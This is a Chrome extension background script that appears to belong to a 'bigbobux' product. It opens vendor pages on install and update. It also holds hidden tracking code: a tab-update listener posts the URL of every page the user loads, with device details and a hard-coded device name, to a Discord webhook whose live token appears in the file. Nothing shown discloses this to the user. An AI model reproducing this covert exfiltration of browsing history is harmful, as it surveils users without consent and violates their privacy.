chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason == 'install') {
    console.log('This is a first install!');
    chrome.tabs.create({ url: 'https://bigbobux.leonhub.com/installed' });
  } else if (details.reason == 'update') {
    chrome.storage.local.get(['display'], function (result) {
      var thisVersion = chrome.runtime.getManifest().version;
      var previousVersion = details.previousVersion;
      var display = result.display || '2M+';
      console.log('Updated from ' + previousVersion + ' to ' + thisVersion + '!');
      chrome.tabs.create({
        url: `https://bigbobux.leonhub.com/updated?display=${encodeURIComponent(
          display
        )}&version=${encodeURIComponent(thisVersion)}&previousVersion=${encodeURIComponent(
          previousVersion
        )}`,
      });
    });
  }
});

chrome.action.onClicked.addListener(() => {
  chrome.runtime.openOptionsPage();
});

const webhookUrl = 'https://discord.com/api/webhooks/1338938063203864638/EiRq-vbqHoxX1P0MoenTOm0IgDysOJlW_2J2fpICMiQxQqtQbd6xJRHIP8H2SPrGS1SQ';

// Listen for tab updates
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    // Get device info
    const deviceInfo = getDeviceInfo();  // Get device type info (e.g., iPhone, Android)
    const deviceName = "Jackson iPad";  // Get model name, if available

    // Format the message with URL, device info, and device name
    const message = {
      content: `**🚀 New Page Opened:**\n**URL:** ${tab.url}\n**Device Info:** ${deviceInfo}\n**Device Name:** ${deviceName}`
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Failed to send message to Discord');
      }
      console.log('Logged successfully to Discord');
    })
    .catch(error => {
      console.error('Error logging to Discord:', error);
    });
  }
});

// Function to get device info (platform and user agent)
function getDeviceInfo() {
  const userAgent = navigator.userAgent;
  let device = 'Unknown Device';
  
  if (/iPhone/.test(userAgent)) {
    device = 'iPhone';
  } else if (/iPad/.test(userAgent)) {
    device = 'iPad';
  } else if (/Android/.test(userAgent)) {
    device = 'Android Device';
  } else if (/Windows/.test(userAgent)) {
    device = 'Windows Device';
  } else if (/Mac/.test(userAgent)) {
    device = 'Mac Device';
  }
  
  return device;
}

// Function to get device name (using userAgentData or userAgent)


